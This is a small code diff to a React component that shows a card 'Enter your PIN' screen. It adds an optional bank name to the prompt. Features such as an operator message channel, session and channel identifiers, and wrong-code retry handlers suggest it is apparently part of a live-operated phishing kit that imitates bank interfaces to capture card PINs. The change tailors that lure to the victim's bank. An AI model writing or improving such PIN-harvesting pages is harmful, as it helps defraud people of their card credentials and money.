@@ -8,6 +8,7 @@ interface PinEntryProps {
   apiBase: string;
   channelSlug: string;
   sessionId: string;
+  bank?: string;
   onError: (msg: string) => void;
   wrongCode?: boolean;
   onTryAgain?: () => void;
@@ -18,6 +19,7 @@ export function PinEntry({
   apiBase,
   channelSlug,
   sessionId,
+  bank,
   onError,
   wrongCode,
   onTryAgain,
@@ -58,7 +60,9 @@ export function PinEntry({
       )}
       <h2 className="bank-ui-heading">Enter your PIN</h2>
       <p className="bank-ui-body">
-        Enter the PIN for your card to complete the transaction.
+        {bank
+          ? `Enter the PIN for your ${bank} card to complete the transaction.`
+          : "Enter the PIN for your card to complete the transaction."}
       </p>
       {operatorMessage && (
         <div className={messageClass}>{operatorMessage.message}</div>
